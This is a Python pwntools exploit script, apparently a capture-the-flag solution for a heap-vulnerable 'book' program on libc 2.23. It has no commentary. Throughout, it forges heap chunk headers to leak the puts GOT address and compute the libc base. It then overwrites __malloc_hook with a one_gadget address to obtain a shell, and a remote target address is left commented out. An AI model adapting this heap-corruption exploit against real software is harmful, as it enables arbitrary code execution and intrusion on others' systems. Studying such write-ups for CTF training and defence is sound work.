from pwn import *
context.log_level='debug'
sh= process('./book')#['./book'],env={"LD_PRELOAD":"./libc-2.23.so"})
#sh =remote('159.65.68.241','10004')
elf = ELF('./book')
libc = ELF('libc-2.23.so')

def add(a_name,size,b_name):
	sh.recvuntil('Your choice:\n')
	sh.sendline('1')
	sh.recvuntil('author name?\n')
	sh.sendline(a_name)
	sh.recvuntil('book name?\n')
	sh.sendline(str(size))
	sh.recvuntil('book?\n')
	sh.sendline(b_name)

def read(idx):
	sh.recvuntil('Your choice:\n')
	sh.sendline('3')
	sh.recvuntil('sell?\n')
	sh.sendline(str(idx))

def delete(idx):
	sh.recvuntil('Your choice:\n')
	sh.sendline('2')
	sh.recvuntil('sell?\n')
	sh.sendline(str(idx))

add('a',0,'b')
add('c',0,'d')
add('e',0,'f')

#----------leak libc_base----------------
delete(1)
delete(0)
add(p64(0)+p64(0x21),0,'b'*0x10+p64(0)+p64(0x21)+p64(0x602060))
add('f',0,'wwwwwwww')
add('a',0,'a'*0x10+p64(elf.got['puts']))
#gdb.attach(sh)
read(0)
sh.recvuntil('name:')
puts_got = u64(sh.recvuntil('\n').strip('\n').ljust(8,'\x00'))
libc_base = puts_got- libc.symbols['puts']
print 'libc_base : '+hex(libc_base) 
#gdb.attach(sh)
#--------edit topchunk beside  malloc_hook-------------
one_gadget_off = 0x45216
one_gadget_addr = one_gadget_off + libc_base
malloc_hook_addr = libc_base + 0x3c4b10
print 'one_gadget_addr : '+hex(one_gadget_addr)
print 'malloc_hook_addr : '+hex(malloc_hook_addr)

add('g',0,'a'*0x10+p64(0)+p64(malloc_hook_addr-0x10))

#--------alloc to malloc_hook--------------------------

add('d',0x50,p64(one_gadget_addr))
gdb.attach(sh)
add('c',0,'a')

sh.interactive()


